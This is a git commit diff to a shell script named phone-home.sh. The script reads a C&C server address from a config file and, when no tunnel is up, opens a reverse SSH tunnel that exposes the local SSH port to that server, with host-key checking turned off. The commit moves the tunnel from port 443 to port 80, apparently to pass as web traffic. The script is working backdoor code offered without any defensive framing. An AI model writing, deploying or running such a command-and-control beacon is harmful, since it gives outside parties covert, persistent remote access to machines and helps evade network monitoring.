9795d89a6f75222ac36637ed1ec64ea00367f142
Ramikan <ganny5891@gmail.com>
2023-03-08 14:03:27 +0000

    Update phone-home.sh

--- phone-home.sh
+++ phone-home.sh
@@ -7,12 +7,12 @@ CNC_IP=$(grep "CNC_IP" config | cut -d '=' -f 2)
 DBUSER=$(grep "DBUSER" config | cut -d '=' -f 2)
 DBPORT=$(grep "DBPORT" config | cut -d '=' -f 2)
 
-if netstat -antp|grep ":443.\+ESTABLISHED.\+/ssh" ; then 
+if netstat -antp|grep ":80.\+ESTABLISHED.\+/ssh" ; then 
     echo "CNC Connection is UP"
 else
     echo "CNC Connection is DOWN"
 
     ## Connect to the C&C ##
     echo Connecting...
-    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
+    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p 80 -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
 fi
